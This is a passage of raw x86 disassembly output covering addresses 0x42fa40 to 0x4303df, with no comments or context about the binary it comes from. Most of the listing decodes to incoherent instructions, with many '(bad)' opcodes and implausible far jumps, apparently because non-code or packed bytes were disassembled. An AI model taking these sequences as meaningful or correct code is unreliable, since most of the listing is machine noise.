  42fa40:	push   ecx
  42fa41:	dec    edx
  42fa42:	dec    esi
  42fa43:	popa   
  42fa44:	stc    
  42fa45:	adc    ecx,esi
  42fa47:	jecxz  0x42f9d0
  42fa49:	or     ebx,DWORD PTR [eax]
  42fa4b:	leave  
  42fa4c:	jb     0x42fa47
  42fa4e:	ror    BYTE PTR [edx],1
  42fa50:	push   ds
  42fa51:	cwde   
  42fa52:	mov    BYTE PTR [ebp-0xf],0x16
  42fa56:	daa    
  42fa57:	adc    al,0x9d
  42fa59:	test   BYTE PTR [ecx+0x49],bh
  42fa5c:	std    
  42fa5d:	pop    es
  42fa5e:	sar    DWORD PTR [ebx+eax*2+0x66],1
  42fa62:	dec    ebx
  42fa63:	inc    esi
  42fa64:	add    BYTE PTR cs:[esi-0x33209c4a],ch
  42fa6b:	leave  
  42fa6c:	add    ecx,esi
  42fa6e:	sahf   
  42fa6f:	and    eax,0x1c1bf96d
  42fa74:	iret   
  42fa75:	aad    0xfa
  42fa77:	mov    ah,0x33
  42fa79:	mov    ch,0xe3
  42fa7b:	add    edi,ebp
  42fa7d:	retf   0x5140
  42fa80:	add    dh,BYTE PTR [edi+eax*1]
  42fa83:	mov    bh,0x65
  42fa85:	int    0x1c
  42fa87:	mov    ebp,0x9eb9c2ea
  42fa8c:	inc    ebp
  42fa8d:	sar    BYTE PTR [eax],0x1e
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	push   ss
  42fb01:	imul   esp,DWORD PTR [edx+0x73],0x1fe7c
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	aaa    
  42fb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb0e:	mov    DWORD PTR ss:[esi+0x26],esp
  42fb12:	xchg   edi,eax
  42fb13:	sbb    ebx,0xffffff99
  42fb16:	dec    ebp
  42fb17:	pop    eax
  42fb18:	jmp    0xf389394f
  42fb1d:	push   cs
  42fb1e:	xchg   ebp,eax
  42fb1f:	jmp    0x2601:0x6987e8cb
  42fb26:	ja     0x42fab0
  42fb28:	dec    ebx
  42fb29:	jecxz  0x42fb71
  42fb2b:	adc    edi,edi
  42fb2d:	mov    al,ds:0x27cc449
  42fb32:	repz (bad) 
  42fb34:	mov    dl,0xc4
  42fb36:	push   eax
  42fb37:	std    
  42fb38:	addr16 push ebx
  42fb3a:	ins    BYTE PTR es:[edi],dx
  42fb3b:	stc    
  42fb3c:	out    0x74,eax
  42fb3e:	pop    ss
  42fb3f:	rcl    DWORD PTR [edx+ebp*2],cl
  42fb42:	xor    BYTE PTR [edx],al
  42fb44:	std    
  42fb45:	adc    ch,ah
  42fb47:	inc    esp
  42fb48:	sub    cl,BYTE PTR [ecx]
  42fb4a:	imul   eax,DWORD PTR [edi+esi*2-0x7674652b],0x16
  42fb52:	sbb    DWORD PTR [edi-0x5c],eax
  42fb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb56:	aam    0xe3
  42fb58:	ds mov ch,0x2
  42fb5b:	pop    edx
  42fb5c:	mov    dh,0x4a
  42fb5e:	dec    ebp
  42fb5f:	retf   0x55f2
  42fb62:	push   edx
  42fb63:	(bad)  [ecx]
  42fb65:	pop    ebx
  42fb66:	pop    ds
  42fb67:	(bad)  
  42fb68:	push   eax
  42fb69:	sub    ah,BYTE PTR [esi]
  42fb6b:	inc    edi
  42fb6c:	pop    esp
  42fb6e:	rcr    DWORD PTR [edi-0x21],cl
  42fb71:	stos   BYTE PTR es:[edi],al
  42fb72:	test   eax,0xc418b818
  42fb77:	xchg   DWORD PTR [eax+0x15],eax
  42fb7a:	idiv   BYTE PTR [esi-0x61b0073f]
  42fb80:	ficom  WORD PTR ds:[eax+eiz*8]
  42fb84:	dec    esp
  42fb85:	xchg   ebx,eax
  42fb86:	push   0xa53dd6b
  42fb8b:	xor    al,0xfa
  42fb8d:	xchg   ebp,eax
  42fb8e:	push   ebx
  42fb8f:	sub    eax,0xf55bc076
  42fb94:	sub    al,0x7b
  42fb96:	and    BYTE PTR [ecx+edx*8+0x68f2e16b],bl
  42fb9d:	or     DWORD PTR ds:0x5b94d71f,edi
  42fba3:	mov    esp,0x88918103
  42fba8:	and    DWORD PTR ds:0x321c1e16,0x3a68784f
  42fbb2:	pop    esp
  42fbb3:	jmp    0x42fb3d
  42fbb5:	pop    edi
  42fbb6:	lahf   
  42fbb7:	jo     0x42fbf1
  42fbb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbba:	mov    esi,0x6c7a1e4b
  42fbbf:	jp     0x42fb80
  42fbc1:	pop    edi
  42fbc2:	inc    esi
  42fbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbc4:	rol    BYTE PTR [ebp-0x445ad5c1],1
  42fbca:	adc    eax,0x9940163c
  42fbcf:	sbb    eax,0x9363f1f
  42fbd4:	jge    0x42fc0b
  42fbd6:	(bad)  
  42fbd8:	fdiv   DWORD PTR [edx]
  42fbda:	stos   DWORD PTR es:[edi],eax
  42fbdb:	xor    DWORD PTR [eax+0x4083508f],0x45
  42fbe2:	mov    DWORD PTR [ebx+0x7b],ebp
  42fbe5:	out    0x6e,eax
  42fbe7:	cmp    bh,ch
  42fbe9:	inc    esi
  42fbea:	xlat   BYTE PTR ds:[ebx]
  42fbeb:	mov    bh,0x3b
  42fbed:	or     al,0xec
  42fbef:	ins    DWORD PTR es:[edi],dx
  42fbf0:	(bad)  
  42fbf1:	inc    ebp
  42fbf2:	jno    0x42fb8e
  42fbf4:	inc    edi
  42fbf5:	sbb    eax,0x90ad7a5a
  42fbfa:	add    al,0x2b
  42fbfc:	adc    esi,DWORD PTR ds:0x2cbdefe2
  42fc02:	sbb    dh,bl
  42fc04:	push   0xffffffc5
  42fc06:	or     al,0x56
  42fc08:	mov    esp,0x4b44e8f7
  42fc0d:	addr16 ret 
  42fc0f:	test   al,0x0
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0xff30:0x2036325e
  42fc82:	jmp    0x42fce7
  42fc84:	cmp    bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	shl    BYTE PTR [esi-0x56],0x54
  42fc90:	push   esp
  42fc91:	retf   
  42fc92:	and    DWORD PTR [ecx],edx
  42fc94:	ficomp WORD PTR [ebp+0x433b5e34]
  42fc9a:	jmp    edi
  42fc9c:	ins    BYTE PTR es:[edi],dx
  42fc9d:	push   ecx
  42fc9e:	test   al,0x41
  42fca0:	ret    0x6125
  42fca3:	rcr    bh,0xe2
  42fca6:	adc    eax,0xe52c53f9
  42fcab:	aad    0x80
  42fcad:	popf   
  42fcae:	mov    ebx,0xad9ec17a
  42fcb3:	mov    dh,0xb2
  42fcb5:	rcl    BYTE PTR [ecx],cl
  42fcb7:	mov    al,ds:0x90e5867e
  42fcbc:	data16 (bad) [eax-0x29]
  42fcc0:	jl     0x42fc7b
  42fcc2:	repz push 0xe381a53e
  42fcc8:	jg     0x42fc53
  42fcca:	les    ebx,FWORD PTR [esi-0x7b]
  42fccd:	cmp    BYTE PTR [ebx],0x53
  42fcd0:	mov    BYTE PTR [ebx+eiz*1],cl
  42fcd3:	clc    
  42fcd4:	js     0x42fc66
  42fcd6:	cmp    edi,DWORD PTR [ecx-0x2c6acd84]
  42fcdc:	loope  0x42fd04
  42fcde:	xchg   DWORD PTR [edi],esp
  42fce0:	gs push esi
  42fce2:	xchg   edi,eax
  42fce3:	xor    eax,0xd023db56
  42fce8:	xor    BYTE PTR [ecx],dh
  42fcea:	fwait
  42fceb:	ror    DWORD PTR [ebx+0x39702fc1],cl
  42fcf1:	pop    ds
  42fcf2:	daa    
  42fcf3:	add    al,bh
  42fcf5:	inc    esi
  42fcf6:	in     al,0xb
  42fcf8:	rcl    ebx,cl
  42fcfa:	js     0x42fd4b
  42fcfc:	cwde   
  42fcfd:	mov    ebx,0xf7b93d1e
  42fd02:	and    DWORD PTR [edi+0x2eb984d1],ebx
  42fd08:	(bad)  
  42fd09:	call   0x142a:0xc410e4fe
  42fd10:	xchg   edi,eax
  42fd11:	cs clc 
  42fd13:	(bad)  [ebx]
  42fd15:	inc    edi
  42fd16:	(bad)  
  42fd17:	jmp    0x42fd30
  42fd19:	ror    DWORD PTR [ebx+0x35903dbd],cl
  42fd1f:	stc    
  42fd20:	jmp    0x57b03788
  42fd25:	sub    al,0xdc
  42fd27:	xor    BYTE PTR [eax],ah
  42fd29:	jne    0x42fcb5
  42fd2b:	sbb    eax,0x70800ca
  42fd30:	mov    ah,0x55
  42fd32:	push   ebp
  42fd33:	and    al,0x11
  42fd35:	js     0x42fd5f
  42fd37:	push   ebp
  42fd38:	jecxz  0x42fda6
  42fd3a:	jns    0x42fd1c
  42fd3c:	mov    edi,0x38ee5b22
  42fd41:	test   eax,0xdc245f26
  42fd46:	jp     0x42fd8a
  42fd48:	es adc eax,0x89284b52
  42fd4e:	sub    DWORD PTR [ecx-0x48],ebp
  42fd51:	adc    al,0xd7
  42fd53:	jae    0x42fdb4
  42fd55:	mov    cl,0xe2
  42fd57:	dec    eax
  42fd58:	mov    dl,0x3a
  42fd5a:	mov    eax,0x16f3f5e3
  42fd5f:	in     al,dx
  42fd60:	test   BYTE PTR [ebx],ch
  42fd62:	enter  0x962c,0x8
  42fd66:	inc    esi
  42fd67:	cmp    DWORD PTR [ebx+ecx*8+0x167e019],eax
  42fd6e:	pop    eax
  42fd6f:	inc    edi
  42fd70:	daa    
  42fd71:	aam    0xc7
  42fd73:	(bad)  [edi]
  42fd75:	mov    ebp,0x78664aa3
  42fd7a:	cmp    al,0xac
  42fd7c:	mov    ah,cl
  42fd7e:	sub    al,0x9e
  42fd80:	outs   dx,BYTE PTR ds:[esi]
  42fd81:	outs   dx,BYTE PTR ds:[esi]
  42fd82:	in     al,0x66
  42fd84:	push   edx
  42fd85:	test   eax,0xc34c6830
  42fd8a:	shl    DWORD PTR [eax-0x6f034045],0x0
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz mov ss,WORD PTR [edi]
  42fe02:	adc    BYTE PTR [edi-0x7c],ah
  42fe05:	add    BYTE PTR [edx],al
  42fe07:	add    BYTE PTR [ecx+eax*1],al
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	test   eax,0x52e9ee77
  42fe11:	push   ds
  42fe12:	dec    esp
  42fe13:	mov    edx,0x267c44b8
  42fe18:	nop
  42fe19:	xor    DWORD PTR [edx-0x80],esp
  42fe1c:	xor    bl,BYTE PTR [edi+eiz*1]
  42fe1f:	or     eax,0x6a9d1596
  42fe24:	mov    al,ds:0x3f9cdad9
  42fe29:	loope  0x42fdfd
  42fe2b:	xchg   DWORD PTR [edi+0x8],ecx
  42fe2e:	dec    esi
  42fe2f:	jae    0x42fdc9
  42fe31:	addr16 cmp cl,0xf2
  42fe35:	rep outs dx,BYTE PTR ds:[esi]
  42fe37:	xchg   esp,eax
  42fe38:	popf   
  42fe39:	rcr    DWORD PTR [edi-0x69],0xae
  42fe3d:	mov    ah,BYTE PTR [esi+ecx*8+0x5b]
  42fe41:	ins    WORD PTR es:[edi],dx
  42fe43:	test   al,0xc
  42fe45:	aaa    
  42fe46:	and    ebx,0x54ce88b5
  42fe4c:	dec    edx
  42fe4d:	arpl   WORD PTR [edx],bp
  42fe4f:	outs   dx,BYTE PTR ds:[esi]
  42fe50:	lahf   
  42fe51:	leave  
  42fe52:	out    0xa6,eax
  42fe54:	imul   edx,DWORD PTR [eax+esi*1+0x44460329],0xb4be274b
  42fe5f:	dec    ecx
  42fe60:	pop    esp
  42fe61:	sub    al,0xf7
  42fe63:	arpl   di,dx
  42fe65:	pop    ebp
  42fe66:	mov    al,0x8d
  42fe68:	jp     0x42fe2b
  42fe6a:	sub    BYTE PTR [ebx],0xf2
  42fe6d:	mov    ah,0x8c
  42fe6f:	data16 aam 0x6b
  42fe72:	sbb    edi,esp
  42fe74:	push   0xffffffbf
  42fe76:	out    0xe6,al
  42fe78:	fst    DWORD PTR [edx-0x37000b29]
  42fe7e:	mov    ecx,edx
  42fe80:	addr16 loop 0x42fe79
  42fe83:	mov    ds:0x65ac9a5b,al
  42fe88:	aam    0x9a
  42fe8a:	dec    ebx
  42fe8b:	jge    0x42feed
  42fe8d:	lahf   
  42fe8e:	int    0x76
  42fe90:	fld    QWORD PTR [ebx]
  42fe92:	mov    bl,0x8a
  42fe94:	push   ss
  42fe95:	pop    edx
  42fe96:	pop    es
  42fe97:	pushf  
  42fe98:	outs   dx,DWORD PTR ds:[esi]
  42fe99:	xlat   BYTE PTR ds:[ebx]
  42fe9a:	(bad)  
  42fe9b:	js     0x42fe7c
  42fe9d:	inc    esp
  42fe9e:	fiadd  WORD PTR [edx]
  42fea0:	push   eax
  42fea1:	ins    DWORD PTR es:[edi],dx
  42fea2:	pop    edx
  42fea3:	in     eax,0x6e
  42fea5:	xlat   BYTE PTR ds:[ebx]
  42fea6:	inc    esp
  42fea7:	sub    ebx,ebp
  42fea9:	adc    DWORD PTR [edx],ebx
  42feab:	dec    ebx
  42feac:	pushf  
  42fead:	inc    eax
  42feae:	pop    eax
  42feaf:	sub    eax,0xc51d3838
  42feb4:	and    al,BYTE PTR [eax+edi*2+0x1d694a3d]
  42febb:	mov    DWORD PTR [edi],ecx
  42febd:	add    al,0xb1
  42febf:	lods   al,BYTE PTR ds:[esi]
  42fec0:	and    ebp,DWORD PTR [ebx]
  42fec2:	(bad)  
  42fec3:	out    dx,eax
  42fec4:	dec    ecx
  42fec5:	jnp    0x42feb2
  42fec7:	ds mov eax,0x8e2e90cc
  42fecd:	fsubp  st(2),st
  42fecf:	sbb    eax,0x4824926a
  42fed4:	push   edi
  42fed5:	rcr    DWORD PTR [esi-0x6d76f91f],0xab
  42fedc:	xchg   ecx,eax
  42fedd:	mov    ecx,0x792bd55b
  42fee2:	xor    BYTE PTR [ebx-0x6fa85441],ch
  42fee8:	jmp    0x42fe8b
  42feea:	push   ebp
  42feeb:	jne    0x42fe71
  42feed:	or     al,0x35
  42feef:	adc    BYTE PTR [ebx+0x63],0x8d
  42fef3:	cmc    
  42fef4:	ds clc 
  42fef6:	mov    esp,0xac755d6
  42fefb:	lds    edi,FWORD PTR [ecx+0x45c6669f]
  42ff01:	call   0x44c0:0xe54f603e
  42ff08:	mov    bh,0x8
  42ff0a:	lea    esi,[ebx-0x42843396]
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edi+edx*8+0x38],0x54
  42ff83:	jmp    0x100:0x20188
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	test   eax,0x7e5288ee
  42ff91:	push   esi
  42ff92:	jo     0x42ff34
  42ff94:	mov    edx,0x9b2d56d2
  42ff99:	scas   al,BYTE PTR es:[edi]
  42ff9a:	adc    eax,0xcb5e695b
  42ff9f:	cmp    cl,al
  42ffa1:	push   esp
  42ffa2:	inc    eax
  42ffa3:	push   edx
  42ffa4:	mov    edi,0x4ebc3c2
  42ffa9:	pop    ebx
  42ffaa:	in     al,dx
  42ffab:	xchg   ebp,eax
  42ffac:	dec    ebp
  42ffad:	ss scas al,BYTE PTR es:[edi]
  42ffaf:	test   DWORD PTR [ebx+eiz*4],0x87369519
  42ffb6:	jne    0x43002d
  42ffb8:	outs   dx,BYTE PTR ds:[esi]
  42ffb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffba:	mov    ds:0xb65fb54e,al
  42ffbf:	jbe    0x42ff85
  42ffc1:	mov    cl,0xb0
  42ffc3:	mov    esi,0xd64563f2
  42ffc8:	sbb    ah,BYTE PTR [edi]
  42ffca:	jb     0x42ff77
  42ffcc:	jp     0x43003f
  42ffce:	inc    eax
  42ffcf:	sbb    al,0xd0
  42ffd1:	cmc    
  42ffd2:	sub    bh,bh
  42ffd4:	sbb    BYTE PTR [ebp+0x3d],cl
  42ffd7:	sbb    eax,0xa26803e1
  42ffdc:	xchg   edx,eax
  42ffdd:	sbb    BYTE PTR [eax],ch
  42ffdf:	ss mov ebp,ecx
  42ffe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffe3:	xor    DWORD PTR [edx-0x24],edi
  42ffe6:	lahf   
  42ffe7:	xchg   esi,eax
  42ffe8:	fistp  DWORD PTR [esi+ecx*1+0x3a]
  42ffec:	push   es
  42ffed:	loope  0x42fffc
  42ffef:	(bad)  
  42fff0:	jno    0x430000
  42fff2:	pusha  
  42fff3:	jl     0x430049
  42fff5:	fcomp  QWORD PTR [esi]
  42fff7:	in     al,0xff
  42fff9:	daa    
  42fffa:	popa   
  42fffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fffc:	jb     0x42ffb4
  42fffe:	shl    esp,cl
  430000:	sub    BYTE PTR [edi-0x58fb8914],dl
  430006:	pusha  
  430007:	and    ch,dh
  430009:	mov    esi,0xb329c4a1
  43000e:	sbb    eax,0x2efc082e
  430013:	add    bl,BYTE PTR [edi+0x74]
  430016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430017:	(bad)  
  430018:	inc    esp
  430019:	dec    esi
  43001a:	mov    al,ds:0x87c63925
  43001f:	push   ss
  430020:	packssdw mm6,mm0
  430023:	sbb    edx,edi
  430025:	and    bl,dl
  430027:	sub    eax,0xee5344fc
  43002c:	(bad)  
  43002d:	sub    edi,DWORD PTR [edx-0x73]
  430030:	ret    
  430031:	test   eax,0x9bbfab92
  430036:	xchg   edx,eax
  430037:	mov    ebp,0x2fb39a3f
  43003c:	adc    eax,DWORD PTR [ebx+eiz*8+0x65]
  430040:	imul   eax,DWORD PTR [eax+0x48],0x5f32af69
  430047:	into   
  430048:	mov    eax,ds:0x1ecfca8e
  43004d:	fs (bad) 
  43004f:	cli    
  430050:	(bad)
  430055:	adc    edi,ebp
  430057:	mov    esp,0x56ecbe64
  43005c:	cmp    esi,DWORD PTR [edi+ebx*8+0x5d8aed8b]
  430063:	jae    0x4300bb
  430065:	in     al,dx
  430066:	cmp    dl,BYTE PTR [edx]
  430068:	pusha  
  430069:	popa   
  43006a:	outs   dx,DWORD PTR ds:[esi]
  43006b:	mov    dl,0xc0
  43006d:	or     BYTE PTR [edx-0x1253feb8],dh
  430073:	pusha  
  430074:	arpl   WORD PTR [edx+esi*4+0x70d4542f],di
  43007b:	in     al,0xda
  43007d:	mov    WORD PTR [edi+0x4d],gs
  430080:	dec    ebp
  430081:	xlat   BYTE PTR ds:[ebx]
  430082:	push   eax
  430083:	cdq    
  430084:	jle    0x4300a3
  430086:	std    
  430087:	lahf   
  430088:	xchg   esi,eax
  430089:	ror    BYTE PTR [ecx+0x7],1
	...
  4300f4:	dec    ebp
  4300f5:	push   ebp
  4300f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4300fc:	mov    esp,ebp
  4300fe:	or     ah,dh
  430100:	dec    ebp
  430101:	add    bh,al
  430103:	add    BYTE PTR [eax],cl
  430105:	add    BYTE PTR [eax],al
  430107:	mov    DWORD PTR [eax],0x40f44545
  43010d:	xor    DWORD PTR [eax],eax
  43010f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430115:	(bad)  
  430116:	enter  0x4d45,0xbc
  43011a:	mov    esi,DWORD PTR [edx]
  43011c:	hlt    
  43011d:	test   ebx,ecx
  43011f:	pushf  
  430120:	enter  0x4df8,0x8b
  430124:	mov    DWORD PTR [ebp+0x8],0x894708
  43012b:	inc    ebp
  43012c:	mov    ebp,0xff8bfffc
  430131:	dec    ebp
  430132:	mov    ch,0xf4
  430134:	call   DWORD PTR [ebx-0x1]
  430137:	mov    ebx,0x8005474
  43013c:	call   DWORD PTR [ecx+0x8]
  43013f:	pop    es
  430140:	jmp    0xb8:0xacb4533
  430147:	fwait
  430148:	mov    esi,DWORD PTR [edx-0xc]
  43014b:	xor    cl,bl
  43014d:	add    BYTE PTR [ebx+0x3c83203],bl
  430153:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430159:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43015f:	xor    eax,DWORD PTR [eax]
  430161:	retf   
  430162:	retf   
  430163:	add    ecx,eax
  430165:	enter  0x894d,0x64
  430169:	dec    ebp
  43016a:	sbb    ah,cl
  43016c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430172:	dec    DWORD PTR [ebx-0xbcfb275]
  430178:	test   DWORD PTR [ebx],esi
  43017a:	dec    ebx
  43017c:	inc    DWORD PTR [ebx]
  43017e:	inc    eax
  43017f:	enter  0x8989,0x50
  430183:	(bad)  
  430184:	call   DWORD PTR [ebx+ecx*4-0x1]
  430188:	cld    
  430189:	dec    DWORD PTR [ebp-0xa90001]
  43018f:	push   edi
  430190:	mov    BYTE PTR [edx+0x1],ch
  430193:	and    al,BYTE PTR [eax]
  430195:	pop    ecx
  430196:	inc    ebp
  430197:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43019d:	push   0xffffff89
  43019f:	pop    ecx
  4301a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301a1:	dec    ebp
  4301a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301a8:	jne    0x4301f4
  4301aa:	lea    eax,[eax]
  4301ac:	push   eax
  4301ad:	(bad)  
  4301ae:	dec    DWORD PTR [eax]
  4301b0:	mov    DWORD PTR [eax],eax
  4301b2:	test   al,0x0
  4301b4:	add    BYTE PTR [ebp-0x18],cl
  4301b7:	xor    ebp,DWORD PTR [ebx]
  4301b9:	add    eax,DWORD PTR [eax]
  4301bb:	mov    eax,eax
  4301bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301c4:	inc    ebp
  4301c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4301cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4301d1:	sub    al,0x80
  4301d3:	inc    DWORD PTR [ecx]
  4301d5:	lea    eax,[eax]
  4301d7:	or     al,0x0
  4301d9:	inc    DWORD PTR [ecx-0x18]
  4301dc:	mov    ecx,DWORD PTR [ebx]
  4301de:	cld    
  4301df:	add    BYTE PTR [ecx+0x75014d],cl
  4301e5:	(bad)  
  4301e6:	xchg   ebp,eax
  4301e7:	fdivr  st,st(7)
  4301e9:	inc    eax
  4301ea:	inc    DWORD PTR [eax]
  4301ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4301ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4301f5:	add    BYTE PTR [edx],dl
  4301f7:	enter  0x4d90,0x0
  4301fb:	mov    eax,DWORD PTR [eax]
  4301fd:	hlt    
  4301fe:	add    al,0xa5
  430200:	mov    al,0xff
  430202:	add    bh,bh
  430204:	add    BYTE PTR [ebx],dh
  430206:	inc    DWORD PTR [ebx]
  430208:	sbb    al,0x89
  43020a:	jne    0x4301e8
  43020c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430212:	mov    eax,DWORD PTR [ebp-0xff0048]
  430218:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43021f:	inc    DWORD PTR [ebp-0x75]
  430222:	fisttp QWORD PTR [esi+ebp*8]
  430225:	test   DWORD PTR [esi-0x1],esp
  430228:	inc    ebp
  430229:	(bad)  
  43022a:	aas    
  43022b:	inc    ebp
  43022c:	(bad)  
  43022d:	lea    edi,[esp+eiz*2-0x1]
  430231:	inc    edi
  430233:	mov    DWORD PTR ds:0x8000c7a0,edi
  430239:	mov    ebp,esp
  43023b:	cld    
  43023c:	loop   0x4301cb
  43023e:	inc    ebp
  43023f:	(bad)  
  430240:	out    dx,al
  430241:	(bad)  
  430242:	fisttp WORD PTR [eax+0x8801c7]
  430248:	jecxz  0x43028f
  43024a:	in     al,dx
  43024b:	inc    DWORD PTR [ebp-0x4]
  43024e:	out    0x8d,eax
  430250:	aas    
  430251:	inc    edi
  430253:	jmp    FWORD PTR [eax-0x78]
  430256:	inc    DWORD PTR [ecx]
  430258:	mov    DWORD PTR [eax],0xc7043d
  43025e:	ins    BYTE PTR es:[edi],dx
  43025f:	test   edi,edi
  430261:	pandn  mm0,mm5
  430264:	aas    
  430265:	add    bh,al
  430267:	mov    esi,DWORD PTR [eax-0x4]
  43026a:	inc    DWORD PTR [eax+0xdf01ee]
  430270:	(bad)  
  430271:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430275:	mov    ebp,ebx
  430277:	xchg   esp,eax
  430278:	fild   DWORD PTR [eax]
  43027a:	(bad)  
  43027b:	mov    edi,DWORD PTR [eax+0x3]
  43027e:	(bad)  
  43027f:	cmp    al,0xe7
  430281:	dec    ebp
  430282:	leave  
  430283:	mov    ebp,eax
  430285:	fsubr  DWORD PTR [edx]
  430287:	add    BYTE PTR [eax],al
  430289:	lea    ecx,[ebx-0x7f0003b4]
  43028f:	push   edx
  430290:	add    DWORD PTR [ebp+0x0],edx
  430293:	mov    esi,DWORD PTR [eax]
  430295:	mov    WORD PTR [edi],ss
  430297:	add    BYTE PTR [eax],al
  430299:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43029f:	add    ah,bh
  4302a1:	push   0x7d
  4302a3:	dec    DWORD PTR [ebx+0xd88c]
  4302a9:	push   edx
  4302aa:	mov    edx,DWORD PTR [ecx-0x4]
  4302ad:	call   DWORD PTR [eax+0x7d01fc]
  4302b3:	mov    esi,DWORD PTR [esi]
  4302b5:	cld    
  4302b6:	add    BYTE PTR [eax+0x560150],dl
  4302bc:	test   DWORD PTR [ebp+0x75],eax
  4302bf:	loop   0x43024c
  4302c1:	jmp    0xe38b:0x947dc7fc
  4302c8:	fsub   st,st(7)
  4302ca:	add    bh,al
  4302cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4302d2:	add    edi,edi
  4302d4:	add    bh,bh
  4302d6:	adc    al,0xed
  4302d8:	add    dh,ah
  4302da:	push   eax
  4302db:	inc    ebp
  4302dc:	push   esi
  4302dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4302e3:	test   BYTE PTR [ebx],dh
  4302e5:	out    0x5,al
  4302e7:	shl    BYTE PTR [edx+0x45],0x0
  4302eb:	jmp    0x4302ae
  4302ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4302f4:	inc    esi
  4302f5:	jle    0x4302f7
  4302f7:	test   edi,eax
  4302f9:	(bad)  
  4302fa:	call   0x13003fe
  4302ff:	out    0x75,al
  430301:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430307:	in     al,dx
  430308:	mov    esp,edx
  43030a:	mov    ah,0x85
  43030c:	add    bh,bh
  43030e:	call   0x1292d12
  430313:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43031a:	add    ebx,esp
  43031c:	add    ah,ch
  43031e:	xor    BYTE PTR [ebp-0xff0073],al
  430324:	mov    ebx,ebp
  430326:	cld    
  430327:	jle    0x4302b2
  430329:	add    DWORD PTR gs:[eax],eax
  43032c:	add    BYTE PTR [eax+0x1],dl
  43032f:	inc    ebp
  430330:	inc    ebp
  430331:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430337:	dec    DWORD PTR [ebx-0x3fd80318]
  43033d:	add    BYTE PTR [ebp-0xbf0040],dl
  430343:	inc    ebp
  430344:	fmul   QWORD PTR [ebx-0x4faf0400]
  43034a:	inc    ebp
  43034b:	add    DWORD PTR [ebx+0x459c00],ecx
  430351:	mov    edi,edi
  430353:	mov    eax,0xe80800ff
  430358:	inc    ebp
  430359:	sub    cl,BYTE PTR [ebx-0x47000400]
  43035f:	add    al,0x1
  430361:	rol    BYTE PTR [eax],0x1e
  430364:	jne    0x4303ab
  430366:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43036c:	inc    DWORD PTR [ecx]
  43036e:	call   0x882c73
  430373:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430379:	call   0x432d7f
  43037e:	xor    bh,bh
  430380:	push   edi
  430381:	adc    BYTE PTR [ebx-0x74741bbb],al
  430387:	fsub   st,st(4)
  430389:	ret    
  43038a:	loopne 0x430327
  43038c:	xor    DWORD PTR [edx],0x31
  43038f:	cmp    edi,edi
  430391:	bswap  eax
  430393:	rol    BYTE PTR gs:[eax],0x5
  430397:	jmp    0x12e04e1
  43039c:	mov    eax,DWORD PTR [ebp-0x4]
  43039f:	add    BYTE PTR [eax+0xff0100],bh
  4303a5:	cld    
  4303a6:	jne    0x430425
  4303a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4303ae:	jb     0x4303b1
  4303b0:	add    BYTE PTR [eax],al
  4303b2:	push   eax
  4303b3:	fild   DWORD PTR [ebp+0x0]
  4303b6:	mov    edx,DWORD PTR [eax-0x68]
  4303b9:	inc    ebp
  4303ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4303c0:	or     bh,bh
  4303c2:	inc    ebp
  4303c3:	call   0x1272ac7
  4303c8:	jge    0x430417
  4303ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4303d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4303d6:	fwait
  4303d7:	mov    eax,0x30132
  4303dc:	lea    esi,[ebp+0x2c]
  4303df:	xor    edi,edi
